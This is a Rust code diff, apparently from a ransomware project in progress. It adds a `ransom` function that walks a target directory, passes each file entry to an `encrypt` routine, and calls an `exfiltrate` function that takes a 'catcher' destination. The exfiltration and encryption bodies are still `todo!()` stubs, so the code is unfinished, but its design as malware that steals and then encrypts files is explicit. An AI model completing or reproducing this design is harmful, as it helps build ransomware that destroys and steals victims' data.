@@ -1,18 +1,33 @@
 use env_logger::{fmt::Target, Builder};
 use log::{debug, error, info, log_enabled, LevelFilter};
-use std::fs::{File, ReadDir};
+use std::fs::{read_dir, DirEntry, File, ReadDir};
 
-pub fn ransom() {
-    println!("ransom mode")
-}
+type FileCount = usize;
+type ByteCount = usize;
 
-fn encrypt_files(files: ReadDir) -> Result<(), &'static str> {
-    for file in files {
-        info!("{:?}", file)
+pub fn ransom(root: &str, catcher: &str) {
+    println!("ransom mode");
+    let files = read_dir(root);
+    match files {
+        Ok(entries) => encrypt_files(entries, catcher),
+        Err(e) => (),
     }
-    Ok(())
 }
 
-fn encrypt(file: File) -> Result<(), &'static str> {
+fn exfiltrate(catcher: &str) -> Result<(FileCount, ByteCount), &'static str> {
+    todo!()
+}
+
+fn encrypt_files(files: ReadDir, catcher: &str) -> () {
+    for file in files {
+        if let Ok(entry) = file {
+            encrypt(entry, catcher);
+        }
+    }
+    todo!()
+}
+
+fn encrypt(file: DirEntry, catcher: &str) -> Result<(), &'static str> {
+    exfiltrate(catcher)?;
     Ok(())
 }
